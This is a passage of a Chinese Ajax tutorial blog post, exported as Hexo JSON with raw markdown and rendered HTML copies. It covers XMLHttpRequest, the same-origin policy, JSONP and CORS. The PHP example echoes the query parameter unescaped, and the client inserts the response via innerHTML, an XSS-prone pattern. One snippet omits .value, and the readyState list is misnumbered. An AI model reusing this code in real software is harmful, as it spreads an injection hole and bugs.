send()方法才算真正发送请求，GET 请求不需要参数，POST 请求需要把 body 部分以字符串或者 FormData 对象传进去。\n\ncode:\n\n```javascript\ndocument.getElementById('submit').onclick = function () {\n    var url = 'index.php?' +'name=' + document.getElementById('name'); \n    request.open('GET',url,true);\n    request.send();\n    return false;\n}\n```\n给提交按钮绑定一个点击事件，在点击的时候将请求数据发送给后台，return false避免表单提交。\n\n这样 Ajax 请求就完成了，已经可以实现不刷新页面局部刷新。\n\n### 后台代码\n\n这里我使用 php 来完成实例。\n\n\n```php\n$a[]=\"Anna\";\n$a[]=\"Brittany\";\n$a[]=\"Cinderella\";\n$a[]=\"Diana\";\n$a[]=\"Eva\";\n$a[]=\"Fiona\";\n$a[]=\"Gunda\";\n$a[]=\"Hege\";\n$a[]=\"Inga\";\n$a[]=\"Johanna\";\n$a[]=\"Kitty\";\n$a[]=\"Linda\";\n$a[]=\"Nina\";\n$a[]=\"Ophelia\";\n$a[]=\"Petunia\";\n$a[]=\"Amanda\";\n$a[]=\"Raquel\";\n$a[]=\"Cindy\";\n$a[]=\"Doris\";\n$a[]=\"Eve\";\n$a[]=\"Evita\";\n$a[]=\"Sunniva\";\n$a[]=\"Tove\";\n$a[]=\"Unni\";\n$a[]=\"Violet\";\n$a[]=\"Liza\";\n$a[]=\"Elizabeth\";\n$a[]=\"Ellen\";\n$a[]=\"Wenche\";\n$a[]=\"Vicky\";\n\n$name = $_GET['name'];\n        \nif(strlen($name) > 0){\n    $result = '';\n    for($i = 0; $i < count($a); $i++){\n        if(strtolower($name) == strtolower($a[$i])){\n            $result = \"find the person: $a[$i]\";\n        }\n    }\n}\nif($result == ''){\n    $result = \"Can't find the person: $name\";\n}\necho $result;\n```\n这样前后端就可以跑通了。\n\n### 测试\n\n![](/assets/2016-02-29-ajax-cross-origin/3.png)\n\n![](/assets/2016-02-29-ajax-cross-origin/4.png)\n\n## 安全限制\n\n注意到了上面 URL 使用的相对路径，如果将它改成绝对路径比如：\n\n```javascript\nvar url = 'http://127.0.0.1:63342/htdocs/ajax/request.php?name=' + document.getElementById('name').value;\n```\n将会报错，在 Chrome 的控制台里，还可以看到错误信息。\n\n这是因为浏览器的同源策略导致的。默认情况下，JavaScript 在发送 Ajax 请求时，URL的域名必须和当前页面完全一致。\n\n> 完全一致的意思是，域名要相同（www.example.com和example.com不同），协议要相同（http和https不同），端口号要相同（默认是:80端口，它和:8080就不同）。有的浏览器口子松一点，允许端口不同，大多数浏览器都会严格遵守这个限制。\n\n\n## 跨域请求方法\n\n一、是通过 Flash 插件发送 HTTP 请求，这种方式可以绕过浏览器的安全限制，但必须安装 Flash，并且跟 Flash 交互。不过 Flash 用起来麻烦，而且现在用得也越来越少了。\n\n二、是通过在同源域名下架设一个代理服务器来转发，JavaScript 负责把请求发送到代理服务器：\n\n```\n'/proxy?url=http:/www.example.com'\n```\n代理服务器再把结果返回，这样就遵守了浏览器的同源策略。这种方式麻烦之处在于需要服务器端额外做开发。\n\n三、JSONP\n> 即JSON with Padding，是JSON的一种“使用模式”，可用于解决主流浏览器的跨域数据访问的问题。\n\n它有个限制，只能用GET请求，并且要求返回 JavaScript。这种方式跨域实际上是利用了浏览器允许跨域引用 JavaScript 资源。\n\n即Web页面上调用Js文件时可以不受跨域限制的影响，不仅如此，凡是拥有'src'这个属性的标签都拥有跨域的能力，比如：script, img, iframe标签。\n\n代码如下：\n\n```javascript\nvar jsonp = document.createElement('script');\njsonp.type = 'text/javascript';\njsonp.src = 'http://www.example.com/remote.js';\ndocument.getElementsByTagName('head')[0].appendChild(jsonp);\n```\n\n四、CORS\n> Cross-Origin Resource Sharing 跨域资源共享, CORS 是一种允许当前域（domain）的资源（比如html/js/web service）被其他域（domain）的脚本请求访问的机制。\n\n注：如果浏览器支持 HTML5，那么就可以一劳永逸地使用新的跨域策略：CORS了。\n\n#### 在了解CORS前，先来搞清楚概念：  \nOrigin 表示本域，也就是浏览器当前页面的域。当 JavaScript 向外域（如sina.com）发起请求后，浏览器收到响应后，首先检查 Access-Control-Allow-Origin 是否包含本域，如果是，则此次跨域请求成功，如果不是，则请求失败，JavaScript 将无法获取到响应的任何数据。\n\n![](/assets/2016-02-29-ajax-cross-origin/5.png)\n\n假设本域是 my.com，外域是 sina.com，只要响应头 Access-Control-Allow-Origin为 http://my.com，或者是*，本次请求就可以成功。\n\n\n\n可见，跨域能否成功，取决于对方服务器是否愿意给你设置一个正确的 Access-Control-Allow-Origin，决定权始终在对方手中。 \n\n服务器端对于 CORS 的支持，主要就是通过设置 Access-Control-Allow-Origin 来进行的,可以添加 header 头：\n\n```php\n//php\nheader(\"Access-Control-Allow-Origin: http://www.example.com\");\n```\n>上面这种跨域请求，称之为“简单请求”。简单请求包括 GET、HEAD和POST(POST的Content-Type类型 仅限application/x-www-form-urlencoded、multipart/form-data和text/plain)，并且不能出现任何自定义头(例如，X-Custom: 12345),通常能满足90%的需求。\n\n注：现代浏览器一般都是用JSONP或者CORS来完成跨域请求。\n\nCORS与JSONP相比，更为先进、方便和可靠。\n\n1. JSONP只能实现GET请求，而CORS支持所有类型的HTTP请求。  \n2. 使用CORS，开发者可以使用普通的XMLHttpRequest发起请求和获得数据，比起JSONP有更好的错误处理。  \n3. JSONP主要被老的浏览器支持，它们往往不支持CORS，而绝大多数现代浏览器都已经支持了CORS。  \n\n\n","slug":"2016-02-29-ajax-and-cross-origin","published":1,"updated":"2016-03-14T13:44:30.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6rx30009xmvd6qle152f","content":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\" target=\"_blank\" rel=\"external\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"Ajax概念\"><a href=\"#Ajax概念\" class=\"headerlink\" title=\"Ajax概念\"></a>Ajax概念</h2><p>Ajax全称为：’Asynchronous Javascript And XML’，即异步 Javascript 和 XML，指的是一种创建交互式网页开发技术。</p>\n<p><strong>注意，Ajax 是一种技术，它并不是一门编程语言。</strong></p>\n<p>简单说来，传统的网页如果需要更新内容，就必须要重新加载整个页面。</p>\n<p>而通过 Ajax 在后台与服务器进行少量的数据交换，可以使网页实现异步更新。这就意味着可以在不重新加载整个网页的情况下，<strong>对网页的某部分进行更新</strong>。</p>\n<p>例：<br><img src=\"/assets/2016-02-29-ajax-cross-origin/1.png\" alt=\"\"></p>\n<p>比如我在百度上搜索 ajax，其实我并没有点击‘百度一下‘按钮进行提交表单，但是页面已经向后台发起 Ajax 请求获取数据，并将获取到的数据在页面上进行局部更新。</p>\n<h2 id=\"Ajax实战\"><a href=\"#Ajax实战\" class=\"headerlink\" title=\"Ajax实战\"></a>Ajax实战</h2><p>了解了 Ajax 的概念之后，接下来就可以学习如何发起 Ajax 请求了。</p>\n<p>在学习 Ajax 之前首先来创建一个form表单：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">label</span>&gt;</span>Name:<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">'text'</span> <span class=\"attr\">id</span>=<span class=\"string\">\"name\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"name\"</span>/&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"提交\"</span> <span class=\"attr\">id</span>=<span class=\"string\">'submit'</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>Result:<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">id</span>=<span class=\"string\">\"result\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>表单中有个输入框和提交按钮，还有一个用来存储结果的 div。<br>效果：<br><img src=\"/assets/2016-02-29-ajax-cross-origin/2.png\" alt=\"\"></p>\n<h3 id=\"Ajax对象创建\"><a href=\"#Ajax对象创建\" class=\"headerlink\" title=\"Ajax对象创建\"></a>Ajax对象创建</h3><p>Ajax 核心是 Javascript 对象 XMLHttpRequest。在创建 Ajax 对象前需要对所使用的浏览器进行判断来创建不同的实例。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> request;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"built_in\">window</span>.XMLHttpRequest)&#123;</span><br><span class=\"line\">\trequest = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\trequest = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">'Microsoft.XMLHTTP'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过检测 window 对象中是否有 XMLHttpRequest 属性来确定浏览器是否支持标准的 XMLHttpRequest。</p>\n<p><strong>注意，请不要用浏览器的 navigator.userAgent 来检测浏览器是否支持某个 Javascript 特性。因为这个字符串可以伪造，而且一般不会采用通过 IE 的版本判断 Javascript 特性。</strong> </p>\n<p>当然也可以使用 try catch 语句来创建 XMLHttpRequest 对象。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> request = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">\trequest = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">&#125;<span class=\"keyword\">catch</span>(e)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">\t\trequest = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">'Msxml2.XMLHTTP'</span>);</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">catch</span>(e)&#123;</span><br><span class=\"line\">\t\trequest = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">'Microsoft.XMLHTTP'</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>基本上常用的创建 Ajax 对象的方式就是这两种，可以选择封装在一个函数中。</p>\n<blockquote>\n<p>XMLHttp=new XMLHttpRequest() 已经被大多数现代标准浏览器所支持。<br>但为了兼容IE浏览器，按微软的方式：XMLHttp=new<br>ActiveXObject(“Msxml2.XMLHTTP”) 支持IE6+的版本。<br>如果捕获错误，则尝试更老的方法：XMLHttp=new<br>ActiveXObject(“Microsoft.XMLHTTP”) 支持IE5.5+的版本。</p>\n</blockquote>\n<h3 id=\"设置回调函数\"><a href=\"#设置回调函数\" class=\"headerlink\" title=\"设置回调函数\"></a>设置回调函数</h3><p>在创建 Ajax 请求后，要先设置 onreadystatechange 回调函数(即在请求数据返回后进行的操作)。在回调函数中通常我们只需通过 readyState === 4 判断请求是否完成。如果已完成，再根据 status === 200 判断是否是一个成功的响应。</p>\n<p>readyState 值：(1.2.3.4.5)</p>\n<ol>\n<li>请求未初始化</li>\n<li>服务器连接已建立</li>\n<li>请求已接收</li>\n<li>请求处理中</li>\n<li>请求已完成，且响应已就绪</li>\n</ol>\n<p>code:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">request.onreadystatechange = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (request.readyState === <span class=\"number\">4</span>)&#123;      </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (request.status === <span class=\"number\">200</span>)&#123;      </span><br><span class=\"line\">            <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'result'</span>).innerHTML = request.responseText;       </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"发送请求\"><a href=\"#发送请求\" class=\"headerlink\" title=\"发送请求\"></a>发送请求</h3><p>接下来就是要设置 XMLHttpRequest 对象中的 open() 方法，open() 方法一共接受三个参数，第一个参数指定是 GET 还是 POST，第二个参数指定 URL 地址，第三个参数指定是否使用异步发送请求，默认值是 true，所以可以不用填写。</p>\n<p><strong>注意：千万不要把第三个参数设置为 false，否则浏览器将停止响应，直到 Ajax 请求完成，如果这个请求耗时10秒，那么10秒内你会发现浏览器处于’假死’状态。</strong></p>\n<p>最后调用 send()方法才算真正发送请求，GET 请求不需要参数，POST 请求需要把 body 部分以字符串或者 FormData 对象传进去。</p>\n<p>code:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'submit'</span>).onclick = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> url = <span class=\"string\">'index.php?'</span> +<span class=\"string\">'name='</span> + <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'name'</span>); </span><br><span class=\"line\">    request.open(<span class=\"string\">'GET'</span>,url,<span class=\"literal\">true</span>);</span><br><span class=\"line\">    request.send();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>给提交按钮绑定一个点击事件，在点击的时候将请求数据发送给后台，return false避免表单提交。</p>\n<p>这样 Ajax 请求就完成了，已经可以实现不刷新页面局部刷新。</p>\n<h3 id=\"后台代码\"><a href=\"#后台代码\" class=\"headerlink\" title=\"后台代码\"></a>后台代码</h3><p>这里我使用 php 来完成实例。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a[]=<span class=\"string\">\"Anna\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Brittany\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Cinderella\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Diana\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Eva\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Fiona\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Gunda\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Hege\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Inga\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Johanna\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Kitty\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Linda\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Nina\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Ophelia\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Petunia\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Amanda\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Raquel\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Cindy\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Doris\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Eve\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Evita\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Sunniva\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Tove\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Unni\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Violet\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Liza\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Elizabeth\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Ellen\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Wenche\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Vicky\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$name = $_GET[<span class=\"string\">'name'</span>];</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"keyword\">if</span>(strlen($name) &gt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    $result = <span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>($i = <span class=\"number\">0</span>; $i &lt; count($a); $i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(strtolower($name) == strtolower($a[$i]))&#123;</span><br><span class=\"line\">            $result = <span class=\"string\">\"find the person: $a[$i]\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($result == <span class=\"string\">''</span>)&#123;</span><br><span class=\"line\">    $result = <span class=\"string\">\"Can't find the person: $name\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $result;</span><br></pre></td></tr></table></figure>\n<p>这样前后端就可以跑通了。</p>\n<h3 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h3><p><img src=\"/assets/2016-02-29-ajax-cross-origin/3.png\" alt=\"\"></p>\n<p><img src=\"/assets/2016-02-29-ajax-cross-origin/4.png\" alt=\"\"></p>\n<h2 id=\"安全限制\"><a href=\"#安全限制\" class=\"headerlink\" title=\"安全限制\"></a>安全限制</h2><p>注意到了上面 URL 使用的相对路径，如果将它改成绝对路径比如：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"string\">'http://127.0.0.1:63342/htdocs/ajax/request.php?name='</span> + <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'name'</span>).value;</span><br></pre></td></tr></table></figure>\n<p>将会报错，在 Chrome 的控制台里，还可以看到错误信息。</p>\n<p>这是因为浏览器的同源策略导致的。默认情况下，JavaScript 在发送 Ajax 请求时，URL的域名必须和当前页面完全一致。</p>\n<blockquote>\n<p>完全一致的意思是，域名要相同（www.example.com和example.com不同），协议要相同（http和https不同），端口号要相同（默认是:80端口，它和:8080就不同）。有的浏览器口子松一点，允许端口不同，大多数浏览器都会严格遵守这个限制。</p>\n</blockquote>\n<h2 id=\"跨域请求方法\"><a href=\"#跨域请求方法\" class=\"headerlink\" title=\"跨域请求方法\"></a>跨域请求方法</h2><p>一、是通过 Flash 插件发送 HTTP 请求，这种方式可以绕过浏览器的安全限制，但必须安装 Flash，并且跟 Flash 交互。不过 Flash 用起来麻烦，而且现在用得也越来越少了。</p>\n<p>二、是通过在同源域名下架设一个代理服务器来转发，JavaScript 负责把请求发送到代理服务器：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;/proxy?url=http:/www.example.com&apos;</span><br></pre></td></tr></table></figure>\n<p>代理服务器再把结果返回，这样就遵守了浏览器的同源策略。这种方式麻烦之处在于需要服务器端额外做开发。</p>\n<p>三、JSONP</p>\n<blockquote>\n<p>即JSON with Padding，是JSON的一种“使用模式”，可用于解决主流浏览器的跨域数据访问的问题。</p>\n</blockquote>\n<p>它有个限制，只能用GET请求，并且要求返回 JavaScript。这种方式跨域实际上是利用了浏览器允许跨域引用 JavaScript 资源。</p>\n<p>即Web页面上调用Js文件时可以不受跨域限制的影响，不仅如此，凡是拥有’src’这个属性的标签都拥有跨域的能力，比如：script, img, iframe标签。</p>\n<p>代码如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> jsonp = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'script'</span>);</span><br><span class=\"line\">jsonp.type = <span class=\"string\">'text/javascript'</span>;</span><br><span class=\"line\">jsonp.src = <span class=\"string\">'http://www.example.com/remote.js'</span>;</span><br><span class=\"line\"><span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">'head'</span>)[<span class=\"number\">0</span>].appendChild(jsonp);</span><br></pre></td></tr></table></figure>\n<p>四、CORS</p>\n<blockquote>\n<p>Cross-Origin Resource Sharing 跨域资源共享, CORS 是一种允许当前域（domain）的资源（比如html/js/web service）被其他域（domain）的脚本请求访问的机制。</p>\n</blockquote>\n<p>注：如果浏览器支持 HTML5，那么就可以一劳永逸地使用新的跨域策略：CORS了。</p>\n<h4 id=\"在了解CORS前，先来搞清楚概念：\"><a href=\"#在了解CORS前，先来搞清楚概念：\" class=\"headerlink\" title=\"在了解CORS前，先来搞清楚概念：\"></a>在了解CORS前，先来搞清楚概念：</h4><p>Origin 表示本域，也就是浏览器当前页面的域。当 JavaScript 向外域（如sina.com）发起请求后，浏览器收到响应后，首先检查 Access-Control-Allow-Origin 是否包含本域，如果是，则此次跨域请求成功，如果不是，则请求失败，JavaScript 将无法获取到响应的任何数据。</p>\n<p><img src=\"/assets/2016-02-29-ajax-cross-origin/5.png\" alt=\"\"></p>\n<p>假设本域是 my.com，外域是 sina.com，只要响应头 Access-Control-Allow-Origin为 <a href=\"http://my.com，或者是*，本次请求就可以成功。\" target=\"_blank\" rel=\"external\">http://my.com，或者是*，本次请求就可以成功。</a></p>\n<p>可见，跨域能否成功，取决于对方服务器是否愿意给你设置一个正确的 Access-Control-Allow-Origin，决定权始终在对方手中。 </p>\n<p>服务器端对于 CORS 的支持，主要就是通过设置 Access-Control-Allow-Origin 来进行的,可以添加 header 头：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//php</span></span><br><span class=\"line\">header(<span class=\"string\">\"Access-Control-Allow-Origin: http://www.example.com\"</span>);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>上面这种跨域请求，称之为“简单请求”。简单请求包括 GET、HEAD和POST(POST的Content-Type类型 仅限application/x-www-form-urlencoded、multipart/form-data和text/plain)，并且不能出现任何自定义头(例如，X-Custom: 12345),通常能满足90%的需求。</p>\n</blockquote>\n<p>注：现代浏览器一般都是用JSONP或者CORS来完成跨域请求。</p>\n<p>CORS与JSONP相比，更为先进、方便和可靠。</p>\n<ol>\n<li>JSONP只能实现GET请求，而CORS支持所有类型的HTTP请求。  </li>\n<li>使用CORS，开发者可以使用普通的XMLHttpRequest发起请求和获得数据，比起JSONP有更好的错误处理。  </li>\n<li>JSONP主要被老的浏览器支持，它们往往不支持CORS，而绝大多数现代浏览器都已经支持了CORS。  </li>\n</ol>\n","excerpt":"","more":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"Ajax概念\"><a href=\"#Ajax概念\" class=\"headerlink\" title=\"Ajax概念\"></a>Ajax概念</h2><p>Ajax全称为：’Asynchronous Javascript And XML’，即异步 Javascript 和 XML，指的是一种创建交互式网页开发技术。</p>\n<p><strong>注意，Ajax 是一种技术，它并不是一门编程语言。</strong></p>\n<p>简单说来，传统的网页如果需要更新内容，就必须要重新加载整个页面。</p>\n<p>而通过 Ajax 在后台与服务器进行少量的数据交换，可以使网页实现异步更新。这就意味着可以在不重新加载整个网页的情况下，<strong>对网页的某部分进行更新</strong>。</p>\n<p>例：<br><img src=\"/assets/2016-02-29-ajax-cross-origin/1.png\" alt=\"\"></p>\n<p>比如我在百度上搜索 ajax，其实我并没有点击‘百度一下‘按钮进行提交表单，但是页面已经向后台发起 Ajax 请求获取数据，并将获取到的数据在页面上进行局部更新。</p>\n<h2 id=\"Ajax实战\"><a href=\"#Ajax实战\" class=\"headerlink\" title=\"Ajax实战\"></a>Ajax实战</h2><p>了解了 Ajax 的概念之后，接下来就可以学习如何发起 Ajax 请求了。</p>\n<p>在学习 Ajax 之前首先来创建一个form表单：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">label</span>&gt;</span>Name:<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">'text'</span> <span class=\"attr\">id</span>=<span class=\"string\">\"name\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"name\"</span>/&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"提交\"</span> <span class=\"attr\">id</span>=<span class=\"string\">'submit'</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>Result:<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">id</span>=<span class=\"string\">\"result\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>表单中有个输入框和提交按钮，还有一个用来存储结果的 div。<br>效果：<br><img src=\"/assets/2016-02-29-ajax-cross-origin/2.png\" alt=\"\"></p>\n<h3 id=\"Ajax对象创建\"><a href=\"#Ajax对象创建\" class=\"headerlink\" title=\"Ajax对象创建\"></a>Ajax对象创建</h3><p>Ajax 核心是 Javascript 对象 XMLHttpRequest。在创建 Ajax 对象前需要对所使用的浏览器进行判断来创建不同的实例。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> request;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"built_in\">window</span>.XMLHttpRequest)&#123;</span><br><span class=\"line\">\trequest = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span 